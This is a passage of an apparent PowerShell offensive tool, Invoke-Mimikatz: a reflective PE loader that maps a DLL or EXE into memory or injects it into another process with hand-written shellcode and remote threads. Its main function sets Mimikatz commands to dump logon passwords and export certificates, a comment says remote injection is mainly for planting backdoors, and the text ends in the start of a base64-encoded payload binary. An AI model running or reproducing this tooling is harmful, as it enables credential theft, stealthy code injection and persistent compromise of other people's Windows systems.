            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
        #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#       {
#           Write-Verbose "Getting SeDebugPrivilege"
#           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#       }   
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
                    if ($OutputPtr -eq [IntPtr]::Zero)
                    {
                        Throw "Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                        Write-Output $Output
                        $Win32Functions.LocalFree.Invoke($OutputPtr);
                    }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    
    Write-Verbose "PowerShell ProcessID: $PID"
    

    if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
    {
        $ExeArgs = "sekurlsa::logonpasswords exit"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    
    $PEBytes64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAVemENURsPXlEbD15RGw9eWGOaXlAbD15YY4xeaRsPXlhji15eGw9eWGOcXlMbD15KhpNeUxsPXsrwxF5TGw9eJ4Z0XkIbD15RGw5eURoPXnbdcV5QGw9eWGOGXn0bD15YY51eUBsPXlhjm15QGw9eWGOeXlAbD15SaWNoURsPXgAAAAAAAAAAAAAAAAAAAABQRQAAZIYGAEt7e1MAAAAAAAAAAPAAIiALAgkAAJ4BAACUAQAAAAAAJFUBAAAQAAAAAACAAQAAAAAQAAAAAgAABQACAAAAAAAFAAIAAAAAAABgAwAABAAAAAAAAAMAQAEAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAYMsCAF4AAADYsgIABAEAAAAQAwD4PwAAAAADAPgNAAAAAAAAAAAAAABQAwCkBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALABACgHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAPKcAQAAEAAAAJ4BAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAC+GwEAALABAAAcAQAAogEAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAAzCAAAADQAgAAGgAAAL4CAAAAAAAAAAAAAAAAAEAAAMAucGRhdGEAAPgNAAAAAAMAAA4AAADYAgAAAAAAAAAAAAAAAABAAABALnJzcmMAAAD4PwAAABADAABAAAAA5gIAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAqgYAAABQAwAACAAAACYDAAAAAAAAAAAAAAAAAE